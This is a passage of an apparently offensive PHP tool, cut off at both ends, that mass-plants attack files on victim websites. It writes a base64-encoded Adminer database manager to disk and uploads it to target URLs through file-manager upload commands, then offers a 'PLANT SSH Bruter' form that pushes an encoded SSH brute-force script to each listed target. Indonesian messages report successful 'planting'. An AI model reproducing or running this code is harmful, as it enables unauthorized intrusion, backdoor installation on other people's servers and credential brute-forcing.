0+aG9tZXBhZ2UoKSl7aWYoJF9HRVRbIm5zIl0hPT0iIil7ZWNobyI8aDMgaWQ9J3RhYmxlcy12aWV3cyc+Ii4nVGFibGVzIGFuZCB2aWV3cycuIjwvaDM+XG4iOyRWZz10YWJsZXNfbGlzdCgpO2lmKCEkVmcpZWNobyI8cCBjbGFzcz0nbWVzc2FnZSc+Ii4nTm8gdGFibGVzLicuIlxuIjtlbHNle2VjaG8iPGZvcm0gYWN0aW9uPScnIG1ldGhvZD0ncG9zdCc+XG4iO2lmKHN1cHBvcnQoInRhYmxlIikpe2VjaG8iPGZpZWxkc2V0PjxsZWdlbmQ+Ii4nU2VhcmNoIGRhdGEgaW4gdGFibGVzJy4iIDxzcGFuIGlkPSdzZWxlY3RlZDInPjwvc3Bhbj48L2xlZ2VuZD48ZGl2PiIsIjxpbnB1dCB0eXBlPSdzZWFyY2gnIG5hbWU9J3F1ZXJ5JyB2YWx1ZT0nIi5oKCRfUE9TVFsicXVlcnkiXSkuIic+IDxpbnB1dCB0eXBlPSdzdWJtaXQnIG5hbWU9J3NlYXJjaCcgdmFsdWU9JyIuJ1NlYXJjaCcuIic+XG4iLCI8L2Rpdj48L2ZpZWxkc2V0PlxuIjtpZigkX1BPU1RbInNlYXJjaCJdJiYkX1BPU1RbInF1ZXJ5Il0hPSIiKXNlYXJjaF90YWJsZXMoKTt9ZWNobyI8dGFibGUgY2VsbHNwYWNpbmc9JzAnIGNsYXNzPSdub3dyYXAgY2hlY2thYmxlJyBvbmNsaWNrPSd0YWJsZUNsaWNrKGV2ZW50KTsnIG9uZGJsY2xpY2s9J3RhYmxlQ2xpY2soZXZlbnQsIHRydWUpOyc+XG4iLCc8dGhlYWQ+PHRyIGNsYXNzPSJ3cmFwIj48dGQ+PGlucHV0IGlkPSJjaGVjay1hbGwiIHR5cGU9ImNoZWNrYm94IiBvbmNsaWNrPSJmb3JtQ2hlY2sodGhpcywgL14odGFibGVzfHZpZXdzKVxbLyk7Ij4nOyRTYj1kb2NfbGluayhhcnJheSgnc3FsJz0+J3Nob3ctdGFibGUtc3RhdHVzLmh0bWwnKSk7ZWNobyc8dGg+Jy4nVGFibGUnLCc8dGQ+Jy4nRW5naW5lJy5kb2NfbGluayhhcnJheSgnc3FsJz0+J3N0b3JhZ2UtZW5naW5lcy5odG1sJykpLCc8dGQ+Jy4nQ29sbGF0aW9uJy5kb2NfbGluayhhcnJheSgnc3FsJz0+J2NoYXJzZXQtbXlzcWwuaHRtbCcpKSwnPHRkPicuJ0RhdGEgTGVuZ3RoJy4kU2IsJzx0ZD4nLidJbmRleCBMZW5ndGgnLiRTYiwnPHRkPicuJ0RhdGEgRnJlZScuJFNiLCc8dGQ+Jy4nQXV0byBJbmNyZW1lbnQnLmRvY19saW5rKGFycmF5KCdzcWwnPT4nZXhhbXBsZS1hdXRvLWluY3JlbWVudC5odG1sJykpLCc8dGQ+Jy4nUm93cycuJFNiLChzdXBwb3J0KCJjb21tZW50Iik/Jzx0ZD4nLidDb21tZW50Jy4kU2I6JycpLCI8L3RoZWFkPlxuIjskUz0wO2ZvcmVhY2goJFZnDQphcyRDPT4kVSl7JFVoPSgkVSE9PW51bGwmJiFwcmVnX21hdGNoKCd+dGFibGV+aScsJFUpKTtlY2hvJzx0cicub2RkKCkuJz48dGQ+Jy5jaGVja2JveCgoJFVoPyJ2aWV3c1tdIjoidGFibGVzW10iKSwkQyxpbl9hcnJheSgkQywkV2csdHJ1ZSksIiIsImZvcm1VbmNoZWNrKCdjaGVjay1hbGwnKTsiKSwnPHRoPicuKHN1cHBvcnQoInRhYmxlIil8fHN1cHBvcnQoImluZGV4ZXMiKT8nPGEgaHJlZj0iJy5oKE1FKS4ndGFibGU9Jy51cmxlbmNvZGUoJEMpLiciIHRpdGxlPSInLidTaG93IHN0cnVjdHVyZScuJyI+Jy5oKCRDKS4nPC9hPic6aCgkQykpO2lmKCRVaCl7ZWNobyc8dGQgY29sc3Bhbj0iNiI+PGEgaHJlZj0iJy5oKE1FKS4idmlldz0iLnVybGVuY29kZSgkQykuJyIgdGl0bGU9IicuJ0FsdGVyIHZpZXcnLiciPicuKHByZWdfbWF0Y2goJ35tYXRlcmlhbGl6ZWR+aScsJFUpPydNYXRlcmlhbGl6ZWQgVmlldyc6J1ZpZXcnKS4nPC9hPicsJzx0ZCBhbGlnbj0icmlnaHQiPjxhIGhyZWY9IicuaChNRSkuInNlbGVjdD0iLnVybGVuY29kZSgkQykuJyIgdGl0bGU9IicuJ1NlbGVjdCBkYXRhJy4nIj4/PC9hPic7fWVsc2V7Zm9yZWFjaChhcnJheSgiRW5naW5lIj0+YXJyYXkoKSwiQ29sbGF0aW9uIj0+YXJyYXkoKSwiRGF0YV9sZW5ndGgiPT5hcnJheSgiY3JlYXRlIiwnQWx0ZXIgdGFibGUnKSwiSW5kZXhfbGVuZ3RoIj0+YXJyYXkoImluZGV4ZXMiLCdBbHRlciBpbmRleGVzJyksIkRhdGFfZnJlZSI9PmFycmF5KCJlZGl0IiwnTmV3IGl0ZW0nKSwiQXV0b19pbmNyZW1lbnQiPT5hcnJheSgiYXV0b19pbmNyZW1lbnQ9MSZjcmVhdGUiLCdBbHRlciB0YWJsZScpLCJSb3dzIj0+YXJyYXkoInNlbGVjdCIsJ1NlbGVjdCBkYXRhJyksKWFzJHg9PiRfKXskaGQ9IiBpZD0nJHgtIi5oKCRDKS4iJyI7ZWNobygkXz8iPHRkIGFsaWduPSdyaWdodCc+Ii4oc3VwcG9ydCgidGFibGUiKXx8JHg9PSJSb3dzInx8KHN1cHBvcnQoImluZGV4ZXMiKSYmJHghPSJEYXRhX2xlbmd0aCIpPyI8YSBocmVmPSciLmgoTUUuIiRfWzBdPSIpLnVybGVuY29kZSgkQykuIickaGQgdGl0bGU9JyRfWzFdJz4/PC9hPiI6IjxzcGFuJGhkPj88L3NwYW4+Iik6Ijx0ZCBpZD0nJHgtIi5oKCRDKS4iJz4mbmJzcDsiKTt9JFMrKzt9ZWNobyhzdXBwb3J0KCJjb21tZW50Iik/Ijx0ZCBpZD0nQ29tbWVudC0iLmgoJEMpLiInPiZuYnNwOyI6IiIpO31lY2hvIjx0cj48dGQ+Jm5ic3A7PHRoPiIuc3ByaW50ZignJWQgaW4gdG90YWwnLGNvdW50KCRWZykpLCI8dGQ+Ii5uYnNwKCR3PT0ic3FsIj8kZy0+cmVzdWx0KCJTRUxFQ1QgQEBzdG9yYWdlX2VuZ2luZSIpOiIiKSwiPHRkPiIubmJzcChkYl9jb2xsYXRpb24oREIsY29sbGF0aW9ucygpKSk7Zm9yZWFjaChhcnJheSgiRGF0YV9sZW5ndGgiLCJJbmRleF9sZW5ndGgiLCJEYXRhX2ZyZWUiKWFzJHgpZWNobyI8dGQgYWxpZ249J3JpZ2h0JyBpZD0nc3VtLSR4Jz4mbmJzcDsiO2VjaG8iPC90YWJsZT5cbiI7aWYoIWluZm9ybWF0aW9uX3NjaGVtYShEQikpeyRPaD0iPGlucHV0IHR5cGU9J3N1Ym1pdCcgdmFsdWU9JyIuJ1ZhY3V1bScuIiciLm9uX2hlbHAoIidWQUNVVU0nIikuIj4gIjskUGU9IjxpbnB1dCB0eXBlPSdzdWJtaXQnIG5hbWU9J29wdGltaXplJyB2YWx1ZT0nIi4nT3B0aW1pemUnLiInIi5vbl9oZWxwKCR3PT0ic3FsIj8iJ09QVElNSVpFIFRBQkxFJyI6IidWQUNVVU0gT1BUSU1JWkUnIikuIj4gIjtlY2hvIjxmaWVsZHNldD48bGVnZW5kPiIuJ1NlbGVjdGVkJy4iIDxzcGFuIGlkPSdzZWxlY3RlZCc+PC9zcGFuPjwvbGVnZW5kPjxkaXY+Ii4oJHc9PSJzcWxpdGUiPyRPaDooJHc9PSJwZ3NxbCI/JE9oLiRQZTooJHc9PSJzcWwiPyI8aW5wdXQgdHlwZT0nc3VibWl0JyB2YWx1ZT0nIi4nQW5hbHl6ZScuIiciLm9uX2hlbHAoIidBTkFMWVpFIFRBQkxFJyIpLiI+ICIuJFBlLiI8aW5wdXQgdHlwZT0nc3VibWl0JyBuYW1lPSdjaGVjaycgdmFsdWU9JyIuJ0NoZWNrJy4iJyIub25faGVscCgiJ0NIRUNLIFRBQkxFJyIpLiI+ICIuIjxpbnB1dCB0eXBlPSdzdWJtaXQnIG5hbWU9J3JlcGFpcicgdmFsdWU9JyIuJ1JlcGFpcicuIiciLm9uX2hlbHAoIidSRVBBSVIgVEFCTEUnIikuIj4gIjoiIikpKS4iPGlucHV0IHR5cGU9J3N1Ym1pdCcgbmFtZT0ndHJ1bmNhdGUnIHZhbHVlPSciLidUcnVuY2F0ZScuIiciLmNvbmZpcm0oKS5vbl9oZWxwKCR3PT0ic3FsaXRlIj8iJ0RFTEVURSciOiInVFJVTkNBVEUiLigkdz09InBnc3FsIj8iJyI6IiBUQUJMRSciKSkuIj4gIi4iPGlucHV0IHR5cGU9J3N1Ym1pdCcgbmFtZT0nZHJvcCcgdmFsdWU9JyIuJ0Ryb3AnLiInIi5jb25maXJtKCkub25faGVscCgiJ0RST1AgVEFCTEUnIikuIj5cbiI7JGw9KHN1cHBvcnQoInNjaGVtZSIpPyRiLT5zY2hlbWFzKCk6JGItPmRhdGFiYXNlcygpKTtpZihjb3VudCgkbCkhPTEmJiR3IT0ic3FsaXRlIil7JG09KGlzc2V0KCRfUE9TVFsidGFyZ2V0Il0pPyRfUE9TVFsidGFyZ2V0Il06KHN1cHBvcnQoInNjaGVtZSIpPyRfR0VUWyJucyJdOkRCKSk7ZWNobyI8cD4iLidNb3ZlIHRvIG90aGVyIGRhdGFiYXNlJy4iOiAiLCgkbD9odG1sX3NlbGVjdCgidGFyZ2V0IiwkbCwkbSk6JzxpbnB1dCBuYW1lPSJ0YXJnZXQiIHZhbHVlPSInLmgoJG0pLiciIGF1dG9jYXBpdGFsaXplPSJvZmYiPicpLCIgPGlucHV0IHR5cGU9J3N1Ym1pdCcgbmFtZT0nbW92ZScgdmFsdWU9JyIuJ01vdmUnLiInPiIsKHN1cHBvcnQoImNvcHkiKT8iIDxpbnB1dCB0eXBlPSdzdWJtaXQnIG5hbWU9J2NvcHknIHZhbHVlPSciLidDb3B5Jy4iJz4iOiIiKSwiXG4iO31lY2hvIjxpbnB1dCB0eXBlPSdoaWRkZW4nIG5hbWU9J2FsbCcgdmFsdWU9Jycgb25jbGljaz1cInNlbGVjdENvdW50KCdzZWxlY3RlZCcsIGZvcm1DaGVja2VkKHRoaXMsIC9eKHRhYmxlc3x2aWV3cylcWy8pKTsiLihzdXBwb3J0KCJ0YWJsZSIpPyIgc2VsZWN0Q291bnQoJ3NlbGVjdGVkMicsIGZvcm1DaGVja2VkKHRoaXMsIC9edGFibGVzXFsvKSB8fCAkUyk7IjoiIikuIlwiPlxuIjtlY2hvIjxpbnB1dCB0eXBlPSdoaWRkZW4nIG5hbWU9J3Rva2VuJyB2YWx1ZT0nJFQnPlxuIiwiPC9kaXY+PC9maWVsZHNldD5cbiI7fWVjaG8iPC9mb3JtPlxuIiwiPHNjcmlwdCB0eXBlPSd0ZXh0L2phdmFzY3JpcHQnPnRhYmxlQ2hlY2soKTs8L3NjcmlwdD5cbiI7fWVjaG8nPHAgY2xhc3M9ImxpbmtzIj48YSBocmVmPSInLmgoTUUpLidjcmVhdGU9Ij4nLidDcmVhdGUgdGFibGUnLiI8L2E+XG4iLChzdXBwb3J0KCJ2aWV3Iik/JzxhIGhyZWY9IicuaChNRSkuJ3ZpZXc9Ij4nLidDcmVhdGUgdmlldycuIjwvYT5cbiI6IiIpLChzdXBwb3J0KCJtYXRlcmlhbGl6ZWR2aWV3Iik/JzxhIGhyZWY9IicuaChNRSkuJ3ZpZXc9JmFtcDttYXRlcmlhbGl6ZWQ9MSI+Jy4nQ3JlYXRlIG1hdGVyaWFsaXplZCB2aWV3Jy4iPC9hPlxuIjoiIik7aWYoc3VwcG9ydCgicm91dGluZSIpKXtlY2hvIjxoMyBpZD0ncm91dGluZXMnPiIuJ1JvdXRpbmVzJy4iPC9oMz5cbiI7JGdnPXJvdXRpbmVzKCk7aWYoJGdnKXtlY2hvIjx0YWJsZSBjZWxsc3BhY2luZz0nMCc+XG4iLCc8dGhlYWQ+PHRyPjx0aD4nLidOYW1lJy4nPHRkPicuJ1R5cGUnLic8dGQ+Jy4nUmV0dXJuIHR5cGUnLiI8dGQ+Jm5ic3A7PC90aGVhZD5cbiI7b2RkKCcnKTtmb3JlYWNoKCRnZw0KYXMkSyl7ZWNobyc8dHInLm9kZCgpLic+JywnPHRoPjxhIGhyZWY9IicuaChNRSkuKCRLWyJST1VUSU5FX1RZUEUiXSE9IlBST0NFRFVSRSI/J2NhbGxmPSc6J2NhbGw9JykudXJsZW5jb2RlKCRLWyJST1VUSU5FX05BTUUiXSkuJyI+Jy5oKCRLWyJST1VUSU5FX05BTUUiXSkuJzwvYT4nLCc8dGQ+Jy5oKCRLWyJST1VUSU5FX1RZUEUiXSksJzx0ZD4nLmgoJEtbIkRURF9JREVOVElGSUVSIl0pLCc8dGQ+PGEgaHJlZj0iJy5oKE1FKS4oJEtbIlJPVVRJTkVfVFlQRSJdIT0iUFJPQ0VEVVJFIj8nZnVuY3Rpb249JzoncHJvY2VkdXJlPScpLnVybGVuY29kZSgkS1siUk9VVElORV9OQU1FIl0pLiciPicuJ0FsdGVyJy4iPC9hPiI7fWVjaG8iPC90YWJsZT5cbiI7fWVjaG8nPHAgY2xhc3M9ImxpbmtzIj4nLihzdXBwb3J0KCJwcm9jZWR1cmUiKT8nPGEgaHJlZj0iJy5oKE1FKS4ncHJvY2VkdXJlPSI+Jy4nQ3JlYXRlIHByb2NlZHVyZScuJzwvYT4nOicnKS4nPGEgaHJlZj0iJy5oKE1FKS4nZnVuY3Rpb249Ij4nLidDcmVhdGUgZnVuY3Rpb24nLiI8L2E+XG4iO31pZihzdXBwb3J0KCJzZXF1ZW5jZSIpKXtlY2hvIjxoMyBpZD0nc2VxdWVuY2VzJz4iLidTZXF1ZW5jZXMnLiI8L2gzPlxuIjskc2c9Z2V0X3ZhbHMoIlNFTEVDVCBzZXF1ZW5jZV9uYW1lIEZST00gaW5mb3JtYXRpb25fc2NoZW1hLnNlcXVlbmNlcyBXSEVSRSBzZXF1ZW5jZV9zY2hlbWEgPSBjdXJyZW50X3NjaGVtYSgpIE9SREVSIEJZIHNlcXVlbmNlX25hbWUiKTtpZigkc2cpe2VjaG8iPHRhYmxlIGNlbGxzcGFjaW5nPScwJz5cbiIsIjx0aGVhZD48dHI+PHRoPiIuJ05hbWUnLiI8L3RoZWFkPlxuIjtvZGQoJycpO2ZvcmVhY2goJHNnDQphcyRYKWVjaG8iPHRyIi5vZGQoKS4iPjx0aD48YSBocmVmPSciLmgoTUUpLiJzZXF1ZW5jZT0iLnVybGVuY29kZSgkWCkuIic+Ii5oKCRYKS4iPC9hPlxuIjtlY2hvIjwvdGFibGU+XG4iO31lY2hvIjxwIGNsYXNzPSdsaW5rcyc+PGEgaHJlZj0nIi5oKE1FKS4ic2VxdWVuY2U9Jz4iLidDcmVhdGUgc2VxdWVuY2UnLiI8L2E+XG4iO31pZihzdXBwb3J0KCJ0eXBlIikpe2VjaG8iPGgzIGlkPSd1c2VyLXR5cGVzJz4iLidVc2VyIHR5cGVzJy4iPC9oMz5cbiI7JE1oPXR5cGVzKCk7aWYoJE1oKXtlY2hvIjx0YWJsZSBjZWxsc3BhY2luZz0nMCc+XG4iLCI8dGhlYWQ+PHRyPjx0aD4iLidOYW1lJy4iPC90aGVhZD5cbiI7b2RkKCcnKTtmb3JlYWNoKCRNaA0KYXMkWCllY2hvIjx0ciIub2RkKCkuIj48dGg+PGEgaHJlZj0nIi5oKE1FKS4idHlwZT0iLnVybGVuY29kZSgkWCkuIic+Ii5oKCRYKS4iPC9hPlxuIjtlY2hvIjwvdGFibGU+XG4iO31lY2hvIjxwIGNsYXNzPSdsaW5rcyc+PGEgaHJlZj0nIi5oKE1FKS4idHlwZT0nPiIuJ0NyZWF0ZSB0eXBlJy4iPC9hPlxuIjt9aWYoc3VwcG9ydCgiZXZlbnQiKSl7ZWNobyI8aDMgaWQ9J2V2ZW50cyc+Ii4nRXZlbnRzJy4iPC9oMz5cbiI7JEw9Z2V0X3Jvd3MoIlNIT1cgRVZFTlRTIik7aWYoJEwpe2VjaG8iPHRhYmxlIGNlbGxzcGFjaW5nPScwJz5cbiIsIjx0aGVhZD48dHI+PHRoPiIuJ05hbWUnLiI8dGQ+Ii4nU2NoZWR1bGUnLiI8dGQ+Ii4nU3RhcnQnLiI8dGQ+Ii4nRW5kJy4iPHRkPjwvdGhlYWQ+XG4iO2ZvcmVhY2goJEwNCmFzJEspe2VjaG8iPHRyPiIsIjx0aD4iLmgoJEtbIk5hbWUiXSksIjx0ZD4iLigkS1siRXhlY3V0ZSBhdCJdPydBdCBnaXZlbiB0aW1lJy4iPHRkPiIuJEtbIkV4ZWN1dGUgYXQiXTonRXZlcnknLiIgIi4kS1siSW50ZXJ2YWwgdmFsdWUiXS4iICIuJEtbIkludGVydmFsIGZpZWxkIl0uIjx0ZD4kS1tTdGFydHNdIiksIjx0ZD4kS1tFbmRzXSIsJzx0ZD48YSBocmVmPSInLmgoTUUpLidldmVudD0nLnVybGVuY29kZSgkS1siTmFtZSJdKS4nIj4nLidBbHRlcicuJzwvYT4nO31lY2hvIjwvdGFibGU+XG4iOyRyYz0kZy0+cmVzdWx0KCJTRUxFQ1QgQEBldmVudF9zY2hlZHVsZXIiKTtpZigkcmMmJiRyYyE9Ik9OIillY2hvIjxwIGNsYXNzPSdlcnJvcic+PGNvZGUgY2xhc3M9J2p1c2gtc3Fsc2V0Jz5ldmVudF9zY2hlZHVsZXI8L2NvZGU+OiAiLmgoJHJjKS4iXG4iO31lY2hvJzxwIGNsYXNzPSJsaW5rcyI+PGEgaHJlZj0iJy5oKE1FKS4nZXZlbnQ9Ij4nLidDcmVhdGUgZXZlbnQnLiI8L2E+XG4iO31pZigkVmcpZWNobyI8c2NyaXB0IHR5cGU9J3RleHQvamF2YXNjcmlwdCc+YWpheFNldEh0bWwoJyIuanNfZXNjYXBlKE1FKS4ic2NyaXB0PWRiJyk7PC9zY3JpcHQ+XG4iO319fXBhZ2VfZm9vdGVyKCk7"; 
		$decode_isi = base64_decode($isi_nama_doang);
		$encode = base64_encode($global);
		$ss = fopen($global,"w");
		fputs($ss, $decode_isi);
		echo "[+] <a href='$korban' target='_blank'>$korban</a> <br>";
		echo "Done Adminer (adminer.php) berhasil di tanam coba cek<br>";
		$url_mkfile = "$korban?cmd=mkfile&name=$global&target=l1_Lw";
 		$post1 = array(
				"target" => "l1_$encode",
				"content" => "$decode_isi",);
 		$post2 = array( "upload[]" => "@$global",);
 		$output_mkfile = ngirim("$korban", $post1);
			$upload_ah = ngirim("$korban?cmd=upload", $post2);
			}
		}
?>
<form method="post">
<input type="submit" name="b" value="PLANT SSH Bruter">
</form>
<?php
$target = explode("\r\n", $_POST['target']);
if($_POST['b']) {
	foreach($target as $korban) {
		$global = "sshbrute.php";
		$isi_nama_doang = "PD9waHANCi8qDQogICAgICAgIC5fXyAgICAgICAgICAgICAgICAgICAgICAuX18gICAgICAgICAgICAgICAgICAgICAgICAgIA0KICBfX19fXyB8X198X19fLl9fLl9fX19fICAgIF9fX18gfCAgfF9fICBfXyBfXyAgX19fXyAgICBfX19fICANCiAvICAgICBcfCAgPCAgIHwgIHxcX18gIFwgXy8gX19fXHwgIHwgIFx8ICB8ICBcLyAgICBcICAvIF9fX1wgDQp8ICBZIFkgIFwgIHxcX19fICB8IC8gX18gXFwgIFxfX198ICAgWSAgXCAgfCAgLyAgIHwgIFwvIC9fLyAgPg0KfF9ffF98ICAvX198LyBfX19ffChfX19fICAvXF9fXyAgPl9fX3wgIC9fX19fL3xfX198ICAvXF9fXyAgLyANCiAgICAgIFwvICAgIFwvICAgICAgICAgIFwvICAgICBcLyAgICAgXC8gICAgICAgICAgIFwvL19fX19fLyAgDQoqICBTU0ggQnJ1dGUtRm9yY2VyDQoqICBXcml0dGVuIGJ5IE1peWFjaHVuZw0KKiAgSG9tZXBhZ2UgICAgIDogaHR0cDovL2phbmlzc2FyaWVzLm9yZw0KKiAgWW91dHViZSBDaGFubmVsOiBodHRwOi8vd3d3LnlvdXR1YmUuY29tL2phbmlzc2FyaWVzb3JnDQoqICBVc2FnZSAgICAgICA6IGh0dHA6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj1oNUZ4M1BCalVDZw0KKiAgQEAgICdzc2gyX2Nvbm5lY3QnIGFuZCAncGNudGxfZm9yaycgZnVuY3Rpb25zIG11c3QgYmUgaW5zdGFsbGVkIG9uIHlvdXIgbWFjaGluZSAoQmFja1RyYWNrNSBSZWNvbW1lbmRlZCkNCiogIEBAICBUaGlzIHRvb2wgaXMgdXNpbmcgcHJvY2VzcyBmb3JraW5nIHN5c3RlbQ0KKiAgQWxsIHJpZ2h0cyByZXNlcnZlZA0KKiAgQ29udGFjdCB3aXRoIGNvZGVyOiBtaXlhY2h1bmdAaG90bWFpbC5jb20gb3IgamFiYmVyLm9yZw0KKi8NCmVycm9yX3JlcG9ydGluZygwKTsNCi8qDQoqIENhbGwgdGhlIGNsYXNzDQoqLw0KJFNTSCA9IG5ldyBTU0hCcnV0ZXIoKTsNCi8qDQoqIERvZXMgY29udHJvbCBpZiAnc3NoMl9jb25uZWN0JyBhbmQgJ3BjbnRsX2ZvcmsnIGZ1bmN0aW9ucyBub3QgaW5zdGFsbGVkDQoqIGlmICdzc2gyX2Nvbm5lY3QnIG9yICdwY250bF9mb3JrJyBmdW5jdGlvbnMgbm90IGluc3RhbGxlZCB5b3UgY2FuJ3QgdXNlIHRoaXMgYnJ1dGUtZm9yY2VyIHRvb2wNCiovDQppZighZnVuY3Rpb25fZXhpc3RzKCJzc2gyX2Nvbm5lY3QiKSkNCnsNCiRTU0gtPnNob3dFcnJvck1zZygxKTsNCn0NCmVsc2VpZighZnVuY3Rpb25fZXhpc3RzKCJwY250bF9mb3JrIikpDQp7DQokU1NILT5zaG93RXJyb3JNc2coMik7DQp9DQovKg0KKiBQYXJzZSBhcmd1bWVudHMNCiogVGhlcmUgaXMgMyB3YXkgdG8gYnJ1dGUNCiogU2luZ2xlICA6IC1oIDxob3N0PiAtdSA8dXNlcj4gLXcgPHdvcmRsaXN0PiAtbyA8b3V0cHV0PiAtdCA8dGhyZWFkPg0KKiBDb21ib2xpc3QgOiAtYyA8Y29tYm9saXN0PiAtbyA8b3V0cHV0PiAtdCA8dGhyZWFkPg0KKiBNdWx0aXBsZSAgOiAtZiA8aG9zdGZpbGU+IC11IDx1c2VyPiAtdyA8d29yZGxpc3Q+IC1vIDxvdXRwdXQ+IC10IDx0aHJlYWQ+DQoqLw0KJG9wdGlvbnNfc2luZ2xlICA9IGdldG9wdCgiaDp1Onc6bzp0OiIpOw0KJG9wdGlvbnNfY29tYm8gICA9IGdldG9wdCgiYzpvOnQ6Iik7DQokb3B0aW9uc19tdWx0aSAgID0gZ2V0b3B0KCJmOnU6dzpvOnQ6Iik7DQovKg0KKiBEb2VzIGFyZ3VtZW50cyBjb250cm9sIQ0KKi8NCmlmKCRvcHRpb25zX3NpbmdsZSkNCnsNCiAgaWYoJG9wdGlvbnNfc2luZ2xlWyJoIl0gIT0gbnVsbCAmJiAkb3B0aW9uc19zaW5nbGVbInUiXSAhPSBudWxsICYmICRvcHRpb25zX3NpbmdsZVsidyJdICE9IG51bGwgJiYgJG9wdGlvbnNfc2luZ2xlWyJvIl0gIT0gbnVsbCAmJiAkb3B0aW9uc19zaW5nbGVbInQiXSAhPSBudWxsKQ0KICB7DQogICRTU0gtPlNpbmdsZUJydXRlKCAkb3B0aW9uc19zaW5nbGVbImgiXSAsICRvcHRpb25zX3NpbmdsZVsidSJdICwgJG9wdGlvbnNfc2luZ2xlWyJ3Il0gLCAkb3B0aW9uc19zaW5nbGVbIm8iXSAsICRvcHRpb25zX3NpbmdsZVsidCJdICk7DQogIH0NCiAgZWxzZXsNCiAgJFNTSC0+c2hvd0Vycm9yTXNnKDMpOw0KICB9DQp9DQplbHNlaWYoJG9wdGlvbnNfY29tYm8pDQp7DQogIGlmKCRvcHRpb25zX2NvbWJvWyJjIl0gIT0gbnVsbCAmJiAkb3B0aW9uc19jb21ib1sibyJdICE9IG51bGwgJiYgJG9wdGlvbnNfY29tYm9bInQiXSAhPSBudWxsKQ0KICB7DQogICRTU0gtPkNvbWJvQnJ1dGUoICRvcHRpb25zX2NvbWJvWyJjIl0gLCAkb3B0aW9uc19jb21ib1sibyJdICwgJG9wdGlvbnNfY29tYm9bInQiXSApOw0KICB9DQogIGVsc2V7DQogICRTU0gtPnNob3dFcnJvck1zZygzKTsNCiAgfQ0KfQ0KZWxzZWlmKCRvcHRpb25zX211bHRpKQ0Kew0KICBpZigkb3B0aW9uc19tdWx0aVsiZiJdICE9IG51bGwgJiYgJG9wdGlvbnNfbXVsdGlbInUiXSAhPSBudWxsICYgJG9wdGlvbnNfbXVsdGlbInciXSAhPSBudWxsICYmICRvcHRpb25zX211bHRpWyJvIl0gIT0gbnVsbCAmJiAkb3B0aW9uc19tdWx0aVsidCJdICE9IG51bGwpDQogIHsNCiAgJFNTSC0+TXVsdGlCcnV0ZSggJG9wdGlvbnNfbXVsdGlbImYiXSAsICRvcHRpb25zX211bHRpWyJ1Il0gLCAkb3B0aW9uc19tdWx0aVsidyJdICwgJG9wdGlvbnNfbXVsdGlbIm8iXSAsICRvcHRpb25zX211bHRpWyJ0Il0gKTsNCiAgfQ0KICBlbHNlew0KICAkU1NILT5zaG93RXJyb3JNc2coMyk7ICANCiAgfQ0KfQ0KZWxzZQ0Kew0KICAkU1NILT5zaG93RXJyb3JNc2coMyk7DQp9DQoNCmNsYXNzIFNTSEJydXRlcg0Kew0KICAvKg0KICAqIFByaW50cyAnTUFJTl9NRVNTQUdFJyBpZiBhcmd1bWVudHMgdXNlZCB3cm9uZw0KICAqLw0KICBjb25zdCBNQUlOX01FU1NBR0UgICAgICA9ICJcbioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKlxuKiBTU0ggQnJ1dGUtRm9yY2VyIFNpbmdsZSBvciBNdWx0aXBsZVxuKiBXcml0dGVuIGJ5IE1peWFjaHVuZ1xuKiBIb21lcGFnZSA6IGh0dHA6Ly9qYW5pc3Nhcmllcy5vcmdcbioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKlxuIjsNCiAgLyoNCiAgKiBQcmludHMgJ05PVF9JTlNUQUxMRURfU1NIJyBpZiBzc2gyX2Nvbm5lY3QgZnVuY3Rpb24gbm90IGZvdW5kDQogICovDQogIGNvbnN0IE5PVF9JTlNUQUxMRURfU1NIICA9ICJPb3BzISAnc3NoMl9jb25uZWN0JyBmdW5jdGlvbiBpc24ndCBleGlzdHMgeW91IGNhbid0IHVzZSB0aGlzIHRvb2wgb24gdGhpcyBtYWNoaW5lXG5cbiI7DQogIC8qDQogICogUHJpbnRzICdOT1RfSU5TVEFMTEVEX1BDTlRMJyBpZiBwY250bF9mb3JrIGZ1bmN0aW9uIG5vdCBmb3VuZA0KICAqLw0KICBjb25zdCBOT1RfSU5TVEFMTEVEX1BDTlRMPSAiT29wcyEgJ3BjbnRsX2ZvcmsnIGZ1bmN0aW9uIGlzbid0IGV4aXN0cyB5b3UgY2FuJ3QgdXNlIHRoaXMgdG9vbCBvbiB0aGlzIG1hY2hpbmVcblxuIjsNCiAgLyoNCiAgKiBQcmludHMgJ0FSR01JU1MnIGlmIGFyZ3VtZW50cyBub3Qgc3BlY2lmaWVkDQogICovDQogIGNvbnN0IEFSR01JU1MgICAgPSAiWyFdV3JvbmcgVXNhZ2UhXG5waHAgU1NIQnJ1dGVyLnBocCAtaCA8aG9zdD4gLXUgPHVzZXI+IC13IDx3b3JkbGlzdD4gLW8gPG91dHB1dD4gLXQgPHRocmVhZD5cbnBocCBTU0hCcnV0ZXIucGhwIC1mIDxob3N0ZmlsZT4gLXUgPHVzZXI+IC13IDx3b3JkbGlzdD4gLW8gPG91dHB1dD4gLXQgPHRocmVhZD5cbnBocCBTU0hCcnV0ZXIucGhwIC1jIDxjb21ib2xpc3Q+IC1vIDxvdXRwdXQ+IC10IDx0aHJlYWQ+XG5cbiI7DQogIC8qDQogICogQ291bnRzIGhvc3RzICYgcGFzc3dvcmRzICwgaW5jcmVtZW50cyBpbiBmb3JlYWNoIGxvb3ANCiAgKi8NCiAgcHJpdmF0ZSAkY291bnRlciAgICAgPSAwOw0KICAvKg0KICAqIFBlcmZvcm1zIGJydXRlIGZvcmNlIHRvIHNwZWNpZmllZCBzaW5nbGUgaG9zdCBhcmd1bWVudHMgLWggPGhvc3Q+IC11IDx1c2VyPiAtdyA8d29yZGxpc3Q+IC1vIDxvdXRwdXQ+IC10IDx0aHJlYWQ+DQogICovDQogIGZ1bmN0aW9uIFNpbmdsZUJydXRlKCAkaG9zdCAsICR1c2VyLCAkd29yZGxpc3QsICRvdXRwdXQgLCAkdGhyZWFkICkNCiAgew0KICBlY2hvICJcbiI7DQogIGVjaG8gIkhvc3Q6ICIuJGhvc3QuIlxuIjsNCiAgZWNobyAiVXNlcjogIi4kdXNlci4iXG5cbiI7DQogICRjaHVua193b3JkbGlzdCA9IGFycmF5X2NodW5rKCBmaWxlKCR3b3JkbGlzdCkgLCAkdGhyZWFkICk7DQogIGZvcmVhY2goJGNodW5rX3dvcmRsaXN0IGFzICRwYXNzd29yZHMpDQogIHsNCiAgICBmb3JlYWNoKCRwYXNzd29yZHMgYXMgJHBhc3N3b3JkKQ0KICAgIHsNCiAgICAgICR0aGlzLT5jb3VudGVyKys7D